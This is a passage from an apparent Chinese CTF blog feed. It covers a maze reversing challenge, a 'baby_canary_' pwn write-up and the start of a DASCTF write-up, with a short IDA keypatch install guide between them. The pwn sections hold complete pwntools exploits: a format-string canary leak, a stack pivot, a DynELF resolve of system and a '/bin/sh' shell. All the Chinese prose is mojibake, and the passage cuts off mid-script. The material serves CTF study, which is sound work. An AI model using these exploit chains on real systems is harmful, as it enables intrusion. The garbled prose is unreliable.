eorr();&#125;</code></pre></div><p>è¿™ä¸€æ®µå¯ä»¥ç¡®å®šè®©è¾“å…¥çš„æ˜¯32ä¸ªå­—ç¬¦ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_004006f0</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>&#123;  <span class="hljs-keyword">int</span> i;  <span class="hljs-keyword">int</span> j;    i = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span> (i &lt; DAT_16) &#123;    j = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span> (j &lt; <span class="hljs-number">8</span>) &#123;      maze[i * <span class="hljs-number">8</span> + j] =           (<span class="hljs-keyword">char</span>)(((<span class="hljs-keyword">int</span>)s_AMz1nG~#--Ma7e~_00411034[i] &amp; *(uint *)(&amp;DAT_00411044 + j * <span class="hljs-number">4</span>)) &gt;&gt;                 (<span class="hljs-number">7U</span> - j &amp; <span class="hljs-number">0x1f</span>));      j = j + <span class="hljs-number">1</span>;    &#125;    i = i + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre></div><p>å¯ä»¥çœ‹åˆ°è¿·å®«æ˜¯åœ¨è¿è¡Œæ—¶æ ¹æ®éƒ¨åˆ†æ•°æ®ï¼Œæ¥ç”Ÿæˆçš„ã€‚å¹¶ä¸”å…¶ä¸­ä¸€è¡Œæ˜¯8ä¸ªæ•°æ®ï¼Œä¸€åˆ—æ˜¯16ä¸ªï¼Œä¸€å…±128ä¸ªæ•°æ®ã€‚</p><p>å¯ä»¥ä½¿ç”¨gdbï¼Œæ–­ç‚¹åœ¨è¿™ä¸ªå‡½æ•°ä¹‹åï¼ŒæŠŠè¿·å®«æå–å‡ºæ¥ã€‚æå–å‡ºæ¥çš„éƒ½æ˜¯0x1 å’Œ 0x0<br>ç»„æˆçš„è¿·å®«ã€‚</p><p>è¿›å…¥æ§åˆ¶èµ°ä½çš„å‡½æ•°ï¼š</p><div class="hljs"><pre><code class="hljs c">heng = <span class="hljs-number">1</span>;shu = <span class="hljs-number">0</span>;pcStackX0 = param_1</code></pre></div><p>è¿™ä¸ªåœ°æ–¹æ§åˆ¶è¯´ï¼Œèµ·å…ˆèµ·ç‚¹æ˜¯ç¬¬1è¡Œçš„ç¬¬2ä¸ªä½ç½®ã€‚</p><p>checkå‡½æ•°ï¼Œä¸»è¦æ˜¯çœ‹ä½ æ˜¯ä¸æ˜¯åœ¨ç§»åŠ¨åï¼Œèµ°åˆ°äº†0ä¸Šï¼Œèµ°åˆ°çš„è¯ï¼Œç¨‹åºå°±åˆ¤ä½ å¤±è´¥ã€‚</p><p>å¾€ä¸‹çœ‹ï¼Œå‘ç°ä¸»è¦åˆ¤æ–­ï¼š</p><div class="hljs"><pre><code class="hljs c">          <span class="hljs-keyword">if</span> (cVar1 != <span class="hljs-string">'U'</span>) &#123;LAB_00400ad4:            <span class="hljs-keyword">if</span> ((heng == <span class="hljs-number">1</span>) &amp;&amp; (shu == <span class="hljs-number">10</span>)) &#123;              uVar3 = <span class="hljs-number">1</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              uVar3 = <span class="hljs-number">0</span>;            &#125;</code></pre></div><p>åœ¨è¿™ä¸€æ®µï¼Œå¯ä»¥ç¡®å®šèµ°åˆ°ç¬¬11åˆ—çš„ç¬¬2ä¸ªæ•°å­—å³å¯ã€‚</p><h4 id="æå–è¿·å®«å›¾å¹¶å¤„ç†"><a href="#æå–è¿·å®«å›¾å¹¶å¤„ç†" class="headerlink" title="æå–è¿·å®«å›¾å¹¶å¤„ç†"></a>æå–è¿·å®«å›¾å¹¶å¤„ç†</h4><h5 id="è„šæœ¬æå–"><a href="#è„šæœ¬æå–" class="headerlink" title="è„šæœ¬æå–"></a>è„šæœ¬æå–</h5><div class="hljs"><pre><code class="hljs c">data=<span class="hljs-string">"AMz1nG~#--Ma7e~"</span>data2=[<span class="hljs-number">0x80</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x1</span>]maze=[]lie=<span class="hljs-number">0</span><span class="hljs-keyword">while</span> lie&lt;<span class="hljs-number">15</span>:    hang=<span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> hang&lt;<span class="hljs-number">8</span>:        # print(hex(ord(data[lie])&amp;data2[hang]),(<span class="hljs-number">7</span>-hang&amp;<span class="hljs-number">0x1f</span>))        maze.append((ord(data[lie])&amp;data2[hang])&gt;&gt;(<span class="hljs-number">7</span>-hang&amp;<span class="hljs-number">0x1f</span>))        hang+=<span class="hljs-number">1</span>    lie+=<span class="hljs-number">1</span>print(maze)</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/lAdA8H.png" srcset="/img/loading.gif" alt></p><p>å°±è¿™è¿·å®«ï¼Œæˆ‘çœ‹äº†å¥½ä¸€ä¼šæ‰èƒ½èµ°å¥½ã€‚ğŸ¤£ğŸ¤£æœäº†è‡ªå·±ï¼Œè€ä»¥ä¸ºæ˜¯æ•°æ®æå–é”™äº†ã€‚</p><div class="hljs"><pre><code class="hljs bash">flag = md5&#123;DDRDDLDDRRRRRDRDDDDDLLDDLLLUUULU&#125;</code></pre></div><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary_"></a><code>baby_canary_</code></h3><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><h5 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h5><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥ç”¨æ¥æ³„æ¼ã€‚</li><li>æ ˆæº¢å‡ºï¼Œåªèƒ½1ä¸ªgadgetã€‚</li></ul><h5 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h5><h6 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h6><p>åªèƒ½æº¢å‡ºä¸€ä¸ªgadgetï¼Œè‚¯å®šæ˜¯æ‰“æ ˆè¿ç§»ï¼Œä½†æ˜¯è·Ÿä»¥å¾€çš„æ ˆè¿ç§»ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€ä¸ªgadgetåªèƒ½æº¢å‡ºåˆ°rbpï¼Œå¹¶ä¸èƒ½è¦†ç›–åˆ°ret addressï¼Œæ‰€ä»¥åªèƒ½è¦†ç›–å¥½rbpåï¼Œåˆ©ç”¨ç¨‹åºèµ°å‡ºè¿™ä¸ªå‡½æ•°åï¼Œå°†è¦ç»“æŸç¨‹åºæ—¶çš„<code>leave ret</code> ã€‚</p><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å› ä¸ºåœ¨èµ°è¿‡ä¸€æ¬¡ <code>leave ret</code>æ—¶ï¼Œæ­¤æ—¶çš„rbpå·²ç»è¢«æ”¹äº†ï¼Œå†è¿‡ç¨‹åºçš„ç¬¬äºŒä¸ªleave ret å‰ï¼Œéœ€è¦è¿‡ä¸€ä¸‹canaryçš„æ£€æµ‹:</p><div class="hljs"><pre><code class="hljs bash">[----------------------------------registers-----------------------------------]RAX: 0x0RBX: 0x0RCX: 0x0RDX: 0x38 (<span class="hljs-string">'8'</span>)RSI: 0x7ffefee5e310 --&gt; 0x26c46b053d3e2f00RDI: 0x0RBP: 0x601198 --&gt; 0x26c46b053d3e2f00RSP: 0x7ffefee5e350 --&gt; 0x7ffefee5e440 --&gt; 0x1RIP: 0x4008de (mov    rdx,QWORD PTR [rbp-0x8])R8 : 0x7f0bb0977700 (0x00007f0bb0977700)R9 : 0x12R10: 0x78 (<span class="hljs-string">'x'</span>)R11: 0x246R12: 0x400680 (xor    ebp,ebp)R13: 0x7ffefee5e440 --&gt; 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="hljs-built_in">trap</span> INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x4008cf:    mov    eax,0x0   0x4008d4:    call   0x4007de   0x4008d9:    mov    eax,0x0=&gt; 0x4008de:    mov    rdx,QWORD PTR [rbp-0x8]   0x4008e2:    xor    rdx,QWORD PTR fs:0x28   0x4008eb:    je     0x4008f2   0x4008ed:    call   0x400600 &lt;__stack_chk_fail@plt&gt;</code></pre></div><p>çœ‹è¿™é‡Œï¼Œåœ¨å–æ•°å€¼æ—¶ï¼Œå…¶åœ¨ä½ è¿ç§»çš„bssæ®µè¯»å–æ•°å€¼åˆ°rdxè¿›è¡Œåˆ¤æ–­çš„ï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€æ¬¡å¾€bssæ®µè¯»çš„æ—¶å€™ï¼Œå¡«å……å¥½canaryçš„å€¼ã€‚</p><p>å¹¶ä¸”è¿™ä¸ªé¢˜ï¼Œåœ¨çœ‹gotè¡¨åˆ°bssæ®µçš„è·ç¦»ä¹Ÿæ˜¯å¾ˆè¿‘çš„ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zbOm9Q.png" srcset="/img/loading.gif" alt></p><p>æ‰€ä»¥åœ¨è¿ç§»çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œä»æœ‰å®é™…æ„ä¹‰çš„å‡½æ•°ï¼ˆæ¯”å¦‚putsï¼‰å¼€å§‹å‰å°±å¾—æŠŠæ ˆæŠ¬é«˜ã€‚å¦åˆ™åœ¨è¿›å…¥libcçš„å†…éƒ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼šå› ä¸ºå„ç§push pop è€Œä¿®æ”¹åˆ°gotå¤„çš„ä¸œè¥¿ï¼Œå¯¼è‡´ä¸ä»…æ³„æ¼çš„æ•°å€¼æœ‰é—®é¢˜ï¼Œå¹¶ä¸”å®¹æ˜“è®©ç¨‹åºå´©æ‰ã€‚</p><div class="hljs"><pre><code class="hljs bash">payload = p64(canary)*(0x100/8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(0)s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*6+p64(bss+0x100-8)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()puts = u64(s.recv(6).ljust(8,<span class="hljs-string">'\x00'</span>))success(hex(puts))s.recvline()</code></pre></div><p>æ­¤å¤„å°±å¯ä»¥æ³„æ¼å‡ºputså‡½æ•°çš„libcåœ°å€ï¼Œä½†æ˜¯ç”±äºå‡ºé¢˜äººæƒ³è€ƒå¯Ÿ<code>ret2dl_runtime_resolve</code>,æ‰€ä»¥åº”è¯¥æ˜¯é­”æ”¹äº†libcã€‚</p><p>ç„¶åå¯ä»¥ä½¿ç”¨DynELFæ¥æå®šï¼Œå‚è€ƒç¾¤é‡Œå¸ˆå‚…åˆ†äº«çš„expã€‚</p><h6 id="Dynelfå‡½æ•°æ€ä¹ˆå†™"><a href="#Dynelfå‡½æ•°æ€ä¹ˆå†™" class="headerlink" title="Dynelfå‡½æ•°æ€ä¹ˆå†™"></a>Dynelfå‡½æ•°æ€ä¹ˆå†™</h6><p>ç”±äºç¨‹åºåªæœ‰putså‡½æ•°æ¥è¾“å‡ºï¼Œå°±ç”¨putså‡½æ•°æ¥è¿›è¡Œæ³„æ¼ã€‚</p><div class="hljs"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">57</span> +p64(canary) * <span class="hljs-number">2</span>  +p64(pop_rdi)+p64(address)+p64(puts_plt)+ p64(start_addr)</code></pre></div><p>æœ¬æ¥æˆ‘æ˜¯è¿™æ ·å†™çš„ï¼Œä½†æ˜¯å‘ç°ç¨‹åºè¿˜æ˜¯ä¼šå´©ï¼Œç”±äºç¨‹åºæƒ…å†µçš„é™åˆ¶ï¼Œæ ˆåªèƒ½æé«˜<code>0x1b0</code>è¿™æ ·ï¼Œè¿˜æ˜¯ä¸å¤Ÿç”¨ã€‚</p><p>è¿˜æ˜¯å°±æƒ³åŠæ³•æå‡æ ˆï¼Œå¾€é«˜ç‚¹çš„bssä¸Šå†™å…¥ropè¿›è¡Œæƒ³è¦çš„æ“ä½œã€‚</p><p>è¿™ä¸ªå°±åœ¨Dynelfå‰å†™å¥½,ç”¨ropæ§åˆ¶å‚æ•°ï¼Œè°ƒç”¨readå‡½æ•°æ¥å¾€é«˜ç‚¹çš„bssæ®µè¿›è¡Œå†™payloadï¼Œå¹¶ä¸”æœ€åç”¨pop rspçš„æ“ä½œï¼ŒæŠŠå†™å¥½rop chainçš„bssçš„åœ°å€pop åˆ°rspä¸Šï¼Œç„¶åå†retä¸Šå»ï¼š</p><div class="hljs"><pre><code class="hljs python">payload = p64(canary)*(<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+<span class="hljs-number">0x500</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)+<span class="hljs-string">"/bin/sh\x00"</span>s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*<span class="hljs-number">6</span>+p64(bss+<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()</code></pre></div><p>æ¥ç€å°±æ˜¯ç”¨è¿™å†™å¥½å¥½çš„rop chainï¼Œè¿›è¡Œæ³„æ¼åœ°å€ï¼Œä¸ºäº†Dynelfå¤šæ¬¡è°ƒç”¨æ³„æ¼ï¼Œåœ¨æ³„æ¼åœ°å€åï¼Œè·Ÿä¸Šreadå‡½æ•°ç»§ç»­å¾€è¿™æ®µåœ°å€ä¸Šè¯»å–åŒæ ·çš„rop chainï¼Œç„¶åå†æ¬¡æ§åˆ¶rspï¼Œæ¥ç€retåˆ°å¯¹åº”çš„ä½ç½®ï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span><span class="hljs-params">(address)</span>:</span>    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)    payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(<span class="hljs-number">0x6015a0</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)    s.recvline(timeout=<span class="hljs-number">0.07</span>)    s.send(payload)    count = <span class="hljs-number">0</span>    up = <span class="hljs-string">""</span>    buf = <span class="hljs-string">''</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        c = s.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.07</span>)        count += <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> up == <span class="hljs-string">'\n'</span> <span class="hljs-keyword">and</span> c == <span class="hljs-string">""</span>:              buf = buf[:<span class="hljs-number">-1</span>]                        buf += <span class="hljs-string">"\x00"</span>            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">else</span>:            buf += c            up = c    data = buf[:<span class="hljs-number">8</span>]    log.debug(<span class="hljs-string">"%#x =&gt; %s"</span> % (address, (data <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>)))    <span class="hljs-keyword">return</span> data</code></pre></div><p>å¯ä»¥çœ‹åˆ°æ˜¯æé«˜äº†0x500ä¸ªå­—èŠ‚çš„åœ°æ–¹è¿›è¡Œropï¼Œåšå¥½ç”¨æ§åˆ¶rspï¼Œretåè¿›è¡Œåå¤æ¨ªè·³è·ƒï¼Œå®Œæˆå¯¹system çš„å¯»æ‰¾ã€‚æ„Ÿè§‰è¿™æ˜¯å¾ˆå¥½çš„åŠæ³•ï¼Œå› ä¸ºæ ˆè¿ç§»çš„æ ¸å¿ƒè¿˜æ˜¯æ§åˆ¶rspï¼Œæœ€åˆå­¦ä¹ æ˜¯è§è¿‡2æ¬¡æ ˆè¿ç§»çš„é¢˜ç›®ï¼Œå½“æ—¶ç”¨çš„è¿˜æ˜¯leave ret æ¥è¿›è¡Œçš„æ§åˆ¶ï¼Œç°åœ¨çœ‹åˆ°ç›´æ¥ä½¿ç”¨pop rsp æ¥æ§åˆ¶ï¼Œçš„ç¡®æ˜¯æ–¹ä¾¿åˆç®€å•çš„åŠæ³•ã€‚</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment"># from LibcSearcher import *</span>s = process(<span class="hljs-string">"./pwn"</span>)<span class="hljs-comment"># s = remote("183.129.189.61",54900)</span>libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)elf = ELF(<span class="hljs-string">"./pwn"</span>)context.log_level=<span class="hljs-string">'debug'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(s)[0],gdbscript='b main')</span>    gdb.attach(s)    pause()pop_rdi = <span class="hljs-number">0x0000000000400963</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000400961</span>pop_rsp_3 = <span class="hljs-number">0x000000000040095d</span>leave_ret = <span class="hljs-number">0x00000000004007dc</span>context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]puts_got = elf.got[<span class="hljs-string">'puts'</span>]read_plt = elf.plt[<span class="hljs-string">'read'</span>]bss = <span class="hljs-number">0x6010a0</span>s.sendafter(<span class="hljs-string">"canary ' s @ # $ % ^ &amp; * :\n"</span>, <span class="hljs-string">"%9$p"</span>)canary = int(s.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>)success(hex(canary))context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">vuln</span><span class="hljs-params">(address)</span>:</span>    payload = p64(pop_rdi)+p64(address)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)    payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>) + \                   p64(read_plt)+p64(pop_rsp_3)+p64(<span class="hljs-number">0x6015a0</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)    s.recvline(timeout=<span class="hljs-number">0.07</span>)    s.send(payload)    count = <span class="hljs-number">0</span>    up = <span class="hljs-string">""</span>    buf = <span class="hljs-string">''</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        c = s.recv(numb=<span class="hljs-number">1</span>, timeout=<span class="hljs-number">0.07</span>)        count += <span class="hljs-number">1</span>        <span class="hljs-keyword">if</span> up == <span class="hljs-string">'\n'</span> <span class="hljs-keyword">and</span> c == <span class="hljs-string">""</span>:              buf = buf[:<span class="hljs-number">-1</span>]                        buf += <span class="hljs-string">"\x00"</span>            <span class="hljs-keyword">break</span>        <span class="hljs-keyword">else</span>:            buf += c            up = c    data = buf[:<span class="hljs-number">8</span>]    log.debug(<span class="hljs-string">"%#x =&gt; %s"</span> % (address, (data <span class="hljs-keyword">or</span> <span class="hljs-string">''</span>).encode(<span class="hljs-string">'hex'</span>)))    <span class="hljs-keyword">return</span> datadebug()payload = p64(canary)*(<span class="hljs-number">0x100</span>/<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(<span class="hljs-number">0</span>)payload += p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x500</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt)+p64(pop_rsp_3)+p64(bss+<span class="hljs-number">0x500</span><span class="hljs-number">-8</span>*<span class="hljs-number">3</span>)+<span class="hljs-string">"/bin/sh\x00"</span>s.sendafter(<span class="hljs-string">"canary ' s 5 0 n g :"</span>,payload)payload = p64(canary)*<span class="hljs-number">6</span>+p64(bss+<span class="hljs-number">0x100</span><span class="hljs-number">-8</span>)s.sendafter(<span class="hljs-string">"canary ' s h 0 m e :"</span>,payload)s.recvline()puts = u64(s.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))success(hex(puts))s.recvline()d = DynELF(vuln,elf=elf)system = d.lookup(<span class="hljs-string">'system'</span>,<span class="hljs-string">'libc'</span>)success(hex(system))payload = p64(pop_rdi)+p64(<span class="hljs-number">0x6010a0</span>+<span class="hljs-number">0x100</span>+<span class="hljs-number">8</span>*<span class="hljs-number">11</span>)+p64(system)s.send(payload)s.interactive()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>pwn</tag>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MacOSå®‰è£…IDAæ’ä»¶keypatch</title>
    <link href="/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/"/>
    <url>/2020/08/10/MacOS%E5%AE%89%E8%A3%85IDA%E6%8F%92%E4%BB%B6keypatch/</url>
    
    <content type="html"><![CDATA[<h1 id="MacOSå®‰è£…IDAæ’ä»¶keypatch"><a href="#MacOSå®‰è£…IDAæ’ä»¶keypatch" class="headerlink" title="MacOSå®‰è£…IDAæ’ä»¶keypatch"></a>MacOSå®‰è£…IDAæ’ä»¶keypatch</h1><p>macOS å®‰è£…å®˜æ–¹ä»‹ç»çš„å®‰è£…æ–¹å¼ä¸å¤ªè¡Œã€‚ç½‘ä¸Šå‚è€ƒåè®°å½•ä¸€ä¸‹ã€‚</p><h2 id="cmake"><a href="#cmake" class="headerlink" title="cmake"></a>cmake</h2><div class="hljs"><pre><code class="hljs bash">brew install cmake</code></pre></div><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/fjh658/keystone-engine.git<span class="hljs-built_in">cd</span> keystone-enginegit submodule update --init --recursivesudo python2 setup.py install --verbose</code></pre></div><p>æ­¤æ—¶åœ¨å®‰è£…åçš„æœ€åå‡ æ®µä»£ç ä¸­ï¼Œæ‰¾åˆ°ç±»ä¼¼ï¼š</p><div class="hljs"><pre><code class="hljs bash">/Library/Python/2.7/site-packages/keystone</code></pre></div><p>è¿™æ˜¯æœ¬åœ°python2.7çš„è·¯å¾„ã€‚</p><h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><div class="hljs"><pre><code class="hljs bash">cp -r /Library/Python/2.7/site-packages/keystone /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/python/lib/python2.7/lib-dynload/</code></pre></div><div class="hljs"><pre><code class="hljs bash">sudo  curl -L https://raw.githubusercontent.com/keystone-engine/keypatch/master/keypatch.py &gt; keypatch.py</code></pre></div><p>ç°å®æ‹’ç»çš„è¯ï¼Œå¯ä»¥</p><div class="hljs"><pre><code class="hljs bash">vim /etc/hosts199.232.68.133 raw.githubusercontent.com</code></pre></div><div class="hljs"><pre><code class="hljs bash">cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida64.app/Contents/MacOS/plugins/cp -r ./keypatch.py /Applications/IDA\ Pro\ 7.0/ida.app/Contents/MacOS/plugins/</code></pre></div><p>ç„¶åè¿›å…¥idaä½¿ç”¨å³å¯ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(7th)</title>
    <link href="/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/"/>
    <url>/2020/07/25/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(7th)/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-7th"><a href="#DASCTFå®‰æ’æœˆèµ›-7th" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›(7th)"></a>DASCTFå®‰æ’æœˆèµ›(7th)</h1><p>åªåšå‡ºä¸ªç­¾åˆ°é¢˜ï¼Œtclã€‚ã€‚ã€‚</p><h2 id="è™šå‡çš„ç­¾åˆ°é¢˜"><a href="#è™šå‡çš„ç­¾åˆ°é¢˜" class="headerlink" title="è™šå‡çš„ç­¾åˆ°é¢˜"></a>è™šå‡çš„ç­¾åˆ°é¢˜</h2><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œä½†æ˜¯å‡ºé¢˜äººä¼°è®¡æ˜¯ç”¨äº†GCC&gt;=4.9ç‰ˆæœ¬ï¼Œæ•…æ„ç»™è¿™ä¸ªStack Buffer Overflow è®¾ç½®éš¾åº¦ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x80485fd</span> &lt;main+<span class="hljs-number">104</span>&gt;:        <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x4</span>]<span class="hljs-number">0x8048600</span> &lt;main+<span class="hljs-number">107</span>&gt;:        <span class="hljs-keyword">leave</span><span class="hljs-number">0x8048601</span> &lt;main+<span class="hljs-number">108</span>&gt;:        <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">esp</span>,[<span class="hljs-built_in">ecx</span>-<span class="hljs-number">0x4</span>]<span class="hljs-number">0x8048604</span> &lt;main+<span class="hljs-number">111</span>&gt;:        <span class="hljs-keyword">ret</span></code></pre></div><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨å¯¹æ ˆçš„ä¿å­˜ä¸Šï¼Œé¢å¤–ä½¿ç”¨äº† ecx æ¥ä¿å­˜æ ˆä¸Šçš„æŸä¸ªå€¼ã€‚å¹¶ä¸”è°ƒè¯•å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥overflowäº† espï¼Œé‚£ä¹ˆä¼šé€ æˆå¥‡æ€ªçš„å½±å“ã€‚</p><p>è¯•ç€åˆ†æä¸€ä¸‹ï¼š</p><ul><li>æƒ³è¦æ§åˆ¶espï¼Œå°±å¾—æ§åˆ¶ecx</li><li>æƒ³è¦æ§åˆ¶ecxï¼Œå°±å¾—è‡³å°‘æ§åˆ¶åˆ°ebp-0x4çš„ä½ç½®</li></ul><p>ç”±äºæ˜¯getsçš„è·å–è¾“å…¥ï¼Œè¿™ä¸ªæ˜æ˜¾å¾ˆå®¹æ˜“å®ç°ã€‚</p><p>æ ¸å¿ƒå°±æ˜¯è®©ï¼š</p><div class="hljs"><pre><code class="hljs undefined">[ [ebp<span class="hljs-number">-0x4</span>] - <span class="hljs-number">0x4</span>] = address(backdoor)</code></pre></div><p>é™„ä¸ŠæˆåŠŸæ—¶æ ˆæƒ…å†µ,æ–­ç‚¹åœ¨0x80485fd ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/cIBzn5.png" srcset="/img/loading.gif" alt></p><p>ç”±äºæ ˆéšæœºåŒ–ï¼Œå…¶ä¸­éœ€è¦ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ³„æ¼<code>[ebp-0x4]</code>ï¼Œæ¥è·å–åœ¨<br>ebp-0x4çš„ä½ç½®å¡«å…¥ä»€ä¹ˆå€¼åˆé€‚ï¼Œä»è€Œå®Œæˆæ”»å‡»ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./qiandao'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># './libc.so.6'</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'183.129.189.60'</span>,<span class="hljs-number">10013</span>)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span 